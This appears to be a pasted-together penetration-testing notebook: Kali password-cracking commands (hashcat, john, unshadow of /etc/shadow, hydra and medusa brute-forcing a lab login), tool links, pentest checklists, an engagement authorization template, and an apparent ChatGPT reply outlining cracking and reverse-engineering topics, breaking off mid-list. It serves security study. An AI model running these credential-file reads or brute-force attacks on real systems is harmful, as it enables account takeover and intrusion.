[2017 - Practical Serialization Attacks by Nicky Bloor](https://www.youtube.com/watch?v=v78bAn1-vqA)

##### nodejs

> ###### Resources

[Exploiting Node.js deserialization bug for Remote Code Execution](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

## 



Chapter 7 - Cracking

> The time to crack a password is related to bit strength, which is a measure of the password's entropy and the details of how the password is stored. Most methods of password cracking require the computer to produce many candidate passwords, each of which is checked. One example is brute-force cracking, in which a computer tries every possible key or password until it succeeds. More common methods of password cracking, such as dictionary attacks, pattern checking, word list substitution, etc. attempt to reduce the number of trials required and will usually be attempted before brute force. Higher password bit strength exponentially increases the number of candidate passwords that must be checked, on average, to recover the password and reduces the likelihood that the password will be found in any cracking dictionary.
>
> _**— Wikipedia**_

looking for contributions to this section. Please DM me on [Twitter](https://twitter.com/dostoevskylabs)

#### Hash Identification

Kali> hash-identifier
> HASH64256BLOOBLAHHAHAHEHE



#### Decoding

Kali> echo"BASE64"| base64 -d
Kali> echo"d3 4d b3 3f"| xxd -r -ps



#### Wordlist Generation

###### Crunch

Kali>
 crunch 6 6 0123456789ABCDEF -o crunch.txt



###### CEWL

Kali> cewl www.wikipedia.com -m 6 -w passwords.txt



###### John

Kali> nano /etc/john/john.conf
Kali> john --wordlist=passwords.txt --rules --stdout > mutated



#### Hashcat

Kali> hashcat -m 400 -a 0 hash /usr/share/wordlists/rockyou.txt
Kali> oclHashcat64.bin -m 110 hash.txt ../wordlist.txt --force



#### Converting for John attacks

Kali> ssh2john file > newfile
Kali> unshadow /etc/passwd /etc/shadow > unshadowed.txt



#### John

Kali> john crackfile --wordlist=/usr/share/wordlists/rockyou.txt



#### BruteForcing

###### Hydra

Kali> hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password" -V -I



###### Medusa

Kali> medusa -h $TARGET -u admin -P passwords.txt -M http -m DIR:/admin -T 10





# Chapter 8 - Reverse Engineering

> Reverse engineering is taking apart an object to see how it works in order to duplicate or enhance the object. The practice, taken from older industries, is now frequently used on computer hardware and software. Software reverse engineering involves reversing a program's machine code back into the source code that it was written in, using program language statements.
>
> _**— Anonymous**_

Reverse Engineering is hard and I'm bad at it, looking for contributions to this section. Please DM me on [Twitter](https://twitter.com/dostoevskylabs)

[Reverse Engineering - WikiPedia](https://en.wikipedia.org/wiki/Reverse_engineering#Reverse_engineering_of_software)

[Intro to Reverse Engineering - YouTube](https://www.youtube.com/playlist?list=PLUFkSN0XLZ-nXcDG89jS9iqKBnNHmz7Qw)

[Intro to Reverse Engineering - Course Files](http://opensecuritytraining.info/IntroductionToReverseEngineering.html)

[Intro to x86 Assembly - YouTube](https://www.youtube.com/playlist?list=PL038BE01D3BAEFDB0)

[Intro to x86 Assembly - Course Files](http://opensecuritytraining.info/IntroX86.html)

[Awesome Reversing](https://github.com/fdivrp/awesome-reversing)

[Reverse Engineering 101 - Malware Unicorn](https://securedorg.github.io/RE101/)

[What Can Reverse Engineering Do For You? - Malware Unicorn](https://www.slideshare.net/AmandaRousseau1/what-can-reverse-engineering-do-for-you)

[Lenas Reversing for Newbies](https://tuts4you.com/download.php?list.17)

[PoC\|\|GTFO 0x16](https://archive.org/stream/pocorgtfo16)

# Chapter 9 - Miscellaneous

> _Good tradecraft keeps espionage routine and boring._
>
> **—Vejas Gabriel Liulevicius**

A collection of useful websites, browser addons, and commands that will likely be useful along the way.

#### Web Tools

[http://rumkin.com/tools/cipher/](http://rumkin.com/tools/cipher/)

[https://wappalyzer.com/](https://wappalyzer.com/)

[https://retdec.com/decompilation/](https://retdec.com/decompilation/)

[https://www.ssllabs.com/ssltest/analyze.html](https://www.ssllabs.com/ssltest/analyze.html)

[https://searchdns.netcraft.com/](https://searchdns.netcraft.com/)

[https://hashkiller.co.uk/ntlm-decrypter.aspx](https://hashkiller.co.uk/ntlm-decrypter.aspx)

[https://www.onlinedisassembler.com/odaweb/](https://www.onlinedisassembler.com/odaweb/)

[https://hashes.org/public.php](https://hashes.org/public.php)

[http://www.csgnetwork.com/hexaddsubcalc.html](http://www.csgnetwork.com/hexaddsubcalc.html)

[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

[https://www.cleancss.com/html-beautify/](https://www.cleancss.com/html-beautify/)

[http://jsbeautifier.org/](http://jsbeautifier.org/)

[http://viewdns.info/](http://viewdns.info/)

[http://www.jsfuck.com/](http://www.jsfuck.com/)

#### Browser Extensions

###### Firefox

FoxyProxy
HackBar
TamperData



#### Stego

Kali> exiftool filename.png
Kali> steghide extract -sf filename.png



#### Further Learning

[Exploit-DB Papers](https://www.exploit-db.com/papers/)

[Dr. Owen Redwood’s Offensive Computer Security \(OCS\) 2.0](http://howto.hackallthethings.com/2016/07/learning-exploitation-with-offensive.html)

[HackTheBox](https://hackthebox.eu)

[VulnHub](https://vulnhub.com)

[Hacksplaining](https://www.hacksplaining.com/exercises)

[Awesome-Bug-Bounty](https://github.com/djadmin/awesome-bug-bounty)
## Penetration Testing Checklist

### 1. Reconnaissance
- [ ] Gather information from public sources (WHOIS, DNS, social media).
- [ ] Identify target’s IP address ranges, domain names, and subdomains.
- [ ] Search for publicly available documents and metadata.
- [ ] Perform DNS enumeration.
- [ ] Identify live hosts using Nmap or Ping.
- [ ] Map network infrastructure and discover accessible services.

### 2. Scanning
- [ ] Conduct a full TCP/UDP port scan using Nmap.
- [ ] Identify running services and their versions.
- [ ] Perform OS detection.
- [ ] Enumerate directories and files using DirBuster or Gobuster.
- [ ] Use Nikto for web server vulnerabilities.
- [ ] Check for default credentials and configurations.
- [ ] Run automated vulnerability scanners (OpenVAS, Nessus).
- [ ] Validate findings manually.

### 3. Vulnerability Assessment
- [ ] Review application logic and workflows for security flaws.
- [ ] Check for common vulnerabilities: SQLi, XSS, CSRF, LFI/RFI, SSRF.
- [ ] Analyze cryptographic practices (SSL/TLS configuration, stored credentials).
- [ ] Review source code for security vulnerabilities (if available).

### 4. Exploitation
- [ ] Exploit identified vulnerabilities using Metasploit or custom scripts.
- [ ] Attempt to gain unauthorized access to systems and services.
- [ ] Test for privilege escalation vulnerabilities.
- [ ] Exploit web vulnerabilities using tools like SQLMap, Burp Suite.

### 5. Post-Exploitation
- [ ] Deploy backdoors or other persistent mechanisms.
- [ ] Identify and exfiltrate sensitive data.
- [ ] Move laterally within the network to compromise additional systems.

### 6. Testing and Validation
- [ ] Validate each vulnerability by reproducing it.
- [ ] Document the impact and likelihood of exploitation.
- [ ] Verify that vulnerabilities have been fixed after remediation.
- [ ] Perform retests to ensure no new issues were introduced.

### 7. Reporting
- [ ] Create a detailed report outlining the methodology, findings, impact, and recommendations.
- [ ] Include proof of concepts (PoCs) and screenshots.
- [ ] Provide a high-level executive summary for non-technical stakeholders.
- [ ] Highlight critical vulnerabilities and immediate actions required.




## Penetration Testing Checklist

### 1. Reconnaissance
#### Passive Reconnaissance
- [ ] Identify the target’s domain and IP address range using WHOIS lookup.
- [ ] Perform DNS enumeration to identify subdomains and DNS records.
- [ ] Gather information from public sources (Google, social media, company website).
- [ ] Check for publicly available documents and extract metadata.

#### Active Reconnaissance
- [ ] Identify live hosts within the target’s IP range using a ping sweep.
- [ ] Perform network discovery to map the target’s network.

### 2. Scanning
#### Network Scanning
- [ ] Conduct a full TCP port scan on identified live hosts.
- [ ] Conduct a full UDP port scan (optional).
- [ ] Identify services and versions running on open ports.
- [ ] Perform OS detection.

#### Web Application Scanning
- [ ] Enumerate directories and files.
- [ ] Scan for web server vulnerabilities.

#### Vulnerability Scanning
- [ ] Run automated vulnerability scanners.
- [ ] Validate findings manually.

### 3. Vulnerability Assessment
- [ ] Review application logic and workflows for security flaws.
- [ ] Test for common web vulnerabilities: SQLi, XSS, CSRF, LFI/RFI, SSRF.
- [ ] Analyze cryptographic practices.
- [ ] Review source code for security vulnerabilities (if available).

### 4. Exploitation
#### Network Exploitation
- [ ] Exploit identified vulnerabilities using Metasploit or custom scripts.
- [ ] Attempt to gain unauthorized access to systems and services.
- [ ] Test for privilege escalation vulnerabilities.

#### Web Application Exploitation
- [ ] Exploit web vulnerabilities using tools like Burp Suite.
- [ ] Check for authentication and session management flaws.
- [ ] Exploit file upload vulnerabilities and command injection.

### 5. Post-Exploitation
- [ ] Deploy backdoors or other persistent mechanisms to maintain access.
- [ ] Identify and exfiltrate sensitive data.
- [ ] Move laterally within the network to compromise additional systems.

### 6. Testing and Validation
- [ ] Validate each vulnerability by reproducing it.
- [ ] Document the impact and likelihood of exploitation.
- [ ] Verify that vulnerabilities have been fixed after remediation.
- [ ] Perform retests to ensure no new issues were introduced.

### 7. Reporting
#### Documentation
- [ ] Create a detailed report outlining the methodology, findings, impact, and recommendations.
- [ ] Include proof of concepts (PoCs) and screenshots for each finding.

#### Executive Summary
- [ ] Provide a high-level summary for non-technical stakeholders.
- [ ] Highlight critical vulnerabilities and immediate actions required.
Your Company Letterhead]

[Date]

[Client's Name]
[Client's Title]
[Client's Company]
[Client's Address]
[City, State, Zip Code]

Dear [Client's Name],

Subject: Penetration Testing Engagement - Scope of Work and Authorization

We appreciate the opportunity to work with [Client's Company] on this important security assessment. This letter outlines the scope, terms, and conditions of the penetration testing engagement to ensure mutual understanding and agreement. Please review the details below and provide your authorization for us to proceed with the testing.
Scope of Work

    Objectives:
        To identify vulnerabilities within [Client's Company]'s network, systems, and applications.
        To assess the effectiveness of security controls and provide recommendations for improvement.

    Targets:
        Network IP Range(s): [List IP ranges]
        Domain(s): [List domains]
        Specific Applications: [List applications]
        Other Assets: [List other assets, if any]

    Testing Types:
        External Testing: Assess the security of [Client's Company]'s external-facing assets.
        Internal Testing: Evaluate the security of internal networks and systems (if applicable).
        Web Application Testing: Test the security of specified web applications.
        Wireless Network Testing: Assess the security of wireless networks (if applicable).

    Testing Methods:
        Reconnaissance: Information gathering from public and internal sources.
        Scanning: Network and application scanning to identify vulnerabilities.
        Vulnerability Assessment: Manual and automated testing to confirm vulnerabilities.
        Exploitation: Controlled exploitation to determine the impact of vulnerabilities.
        Post-Exploitation: Assess the potential for lateral movement and data exfiltration.
        Reporting: Comprehensive report detailing findings, impacts, and recommendations.

Terms and Conditions

    Authorization:
        [Your Company] is authorized to perform the above-mentioned tests on the specified targets.
        Testing will be conducted during the agreed-upon timeframe: [Start Date] to [End Date].

    Confidentiality:
        All information gathered during the engagement will be kept confidential.
        Reports and findings will be shared only with designated personnel of [Client's Company].

    Non-Disclosure:
        Both parties agree not to disclose any confidential information related to this engagement to any third party without prior written consent.

    Liability:
        [Your Company] will take all necessary precautions to minimize the impact of testing.
        [Your Company] is not liable for any unintentional disruptions or damages resulting from the testing activities.

    Exclusions:
        Social engineering attacks, such as phishing, are excluded from this engagement unless explicitly authorized.
        Physical security testing is excluded unless explicitly authorized.

    Client Responsibilities:
        Provide necessary access and credentials to perform internal testing (if applicable).
        Inform relevant staff about the testing to avoid false positives in monitoring systems.
        Provide a point of contact for any issues that arise during the testing.

Authorization

By signing below, you acknowledge and authorize [Your Company] to conduct the penetration testing as described in this document.

[Your Company Name]

Signature: __________________________
Name: [Your Name]
Title: [Your Title]
Date: [Date]

[Client's Company Name]

Signature: __________________________
Name: [Client's Name]
Title: [Client's Title]
Date: [Date]




Please return a signed copy of this letter to confirm your authorization. If you have any questions or require further clarification, please do not hesitate to contact me at [Your Phone Number] or [Your Email Address].

Thank you for your trust in [Your Company]. We look forward to working with you to enhance your security posture.

Sincerely,

[Your Name]
[Your Title]
[Your Company]
[Your Phone Number]
[Your Email Address]
                                                                  
ChatGPT said:
ChatGPT

Sure, I'd be happy to contribute to the Cracking and Reverse Engineering sections of your guide. Below are detailed additions for each chapter:
Chapter 7 - Cracking

Cracking, in the context of cybersecurity, refers to the process of identifying weaknesses in systems, applications, or cryptographic protections to gain unauthorized access or to bypass security mechanisms. It encompasses a range of techniques aimed at defeating protections such as password hashes, license validations, or encryption schemes.
Common Cracking Techniques

    Password Cracking: Attempting to discover passwords through various methods.
        Brute Force Attacks: Trying every possible combination until the correct one is found. This method is exhaustive and time-consuming but guarantees success given enough time and resources.
        Dictionary Attacks: Utilizing a list of common passwords, phrases, or words to guess the password. This approach is faster than brute force and effective against weak or commonly used passwords.
        Hybrid Attacks: Combining dictionary attacks with brute force by modifying dictionary words with common substitutions (e.g., replacing 'a' with '@').
        Rainbow Table Attacks: Using precomputed tables of hash values for commonly used passwords to reverse-engineer the original password from its hash.

    Key Cracking: Attempting to recover encryption keys or license keys.
        Cryptanalysis: Analyzing the cryptographic algorithms and their implementations to find weaknesses that can be exploited to recover keys without brute-forcing.
        Side-Channel Attacks: Gaining information from the physical implementation of a system (e.g., timing information, power consumption) to deduce secret keys.

    Software Cracking: Modifying software to remove or disable features such as copy protection, trial limitations, or activation requirements.
        Patching: Altering the executable code to bypass license checks or other restrictions.
        Serial Key Generation: Creating valid license keys by understanding and replicating the algorithm used to generate them.

Tools for Cracking

    John the Ripper: A fast password cracker that supports various hashing algorithms and can perform dictionary and brute-force attacks.
    Hashcat: An advanced password recovery tool that utilizes GPU acceleration to perform high-speed brute-force, dictionary, and hybrid attacks.
    Cain & Abel: A Windows-based tool that can recover various types of passwords using methods like network packet sniffing, cracking hashed passwords, and more.
    Aircrack-ng: A suite of tools for assessing Wi-Fi network security, including capabilities to crack WEP and WPA-PSK keys.

Best Practices for Cracking

    Ethical Considerations: Always ensure that cracking activities are authorized and legal. Unauthorized cracking can lead to severe legal consequences.
    Use of Strong Passwords: Encourage the use of complex, lengthy, and unique passwords to mitigate the risk of successful cracking attempts.
    Salting Hashes: Implementing salts (random data) in password hashing processes to protect against rainbow table attacks.
    Regular Security Audits: Conduct periodic security assessments to identify and remediate vulnerabilities that could be exploited through cracking techniques.

Challenges in Cracking

    Computational Resources: Cracking can be resource-intensive, especially for complex passwords or robust encryption algorithms.
    Time Constraints: Depending on the strength of the password or key, cracking can take anywhere from seconds to years.
    Advanced Protections: Modern security measures like account lockouts, multi-factor authentication, and adaptive hashing algorithms increase the difficulty of successful cracking.

Mitigating Cracking Risks

    Implement Strong Password Policies: Enforce policies that require the use of complex and unique passwords.
    Use Multi-Factor Authentication (MFA): Adding additional verification steps reduces the reliance on password security alone.
    Employ Robust Hashing Algorithms: Utilize hashing algorithms that are resistant to brute-force and rainbow table attacks, such as bcrypt, scrypt, or Argon2.
    Monitor and Detect Suspicious Activities: Implement intrusion detection systems (IDS) and monitor logs for signs of cracking attempts, such as multiple failed login attempts.

Chapter 8 - Reverse Engineering

Reverse engineering involves analyzing a system's components and functionalities to understand its design, architecture, and operation. In the realm of software, it typically refers to the process of deconstructing executable code to comprehend its behavior, identify vulnerabilities, or reproduce its functionality without access to the original source code.
Objectives of Reverse Engineering

    Security Analysis: Identifying vulnerabilities, backdoors, or malicious code within software applications.
    Software Compatibility: Ensuring interoperability between different software systems or migrating to new platforms.
    Intellectual Property Assessment: Detecting unauthorized use or infringement of proprietary technologies.
    Malware Analysis: Understanding the behavior of malicious software to develop defenses or remove infections.

Common Reverse Engineering Techniques

    Static Analysis: Examining the code without executing it.
        Disassembly: Translating machine code into assembly language using disassemblers like IDA Pro, Ghidra, or Radare2.
        Decompilation: Converting machine code back into high-level code (e.g., C or C++) using decompilers to approximate the original source code.

    Dynamic Analysis: Observing the system during execution.
        Debugging: Using debuggers (e.g., GDB, WinDbg) to step through code, inspect variables, and monitor execution flow.
        Tracing and Monitoring: Tracking system calls, API calls, and other interactions using tools like strace or Process Monitor.

    Binary Analysis: Investigating compiled binaries to understand their structure and behavior.
        Signature Analysis: Identifying known patterns or signatures within the binary to recognize functionalities or libraries used.
        Control Flow Analysis: Mapping out the execution paths and logic within the binary to understand its operation.

    Code Obfuscation and Deobfuscation: Dealing with intentionally complex or obscured code designed to prevent reverse engineering.
        Deobfuscation Tools: Utilizing tools or scripts to simplify obfuscated code and make it more readable.

Tools for Reverse Engineering

    IDA Pro: A powerful disassembler and debugger for analyzing executable files and understanding assembly code.
    Ghidra: A free and open-source reverse engineering suite developed by the NSA, offering features for disassembly, decompilation, and binary analysis.
    Radare2: An open-source framework for reverse engineering and analyzing binaries, with capabilities for disassembly, debugging, and more.
    OllyDbg: A 32-bit assembler level debugger for Windows, useful for analyzing binaries and debugging.
    Binary Ninja: A reverse engineering platform offering an interactive disassembler and decompiler with a user-friendly interface.

Challenges in Reverse Engineering

    Code Obfuscation: Techniques used to make code difficult to analyze, including control flow flattening, packing, and encryption.
    Anti-Debugging Mechanisms: Methods employed by software to detect and thwart debugging attempts, such as checking for debugger presence or using timing checks.
    Legal and Ethical Constraints:

2/2
ChatGPT can make mistakes. Check important info.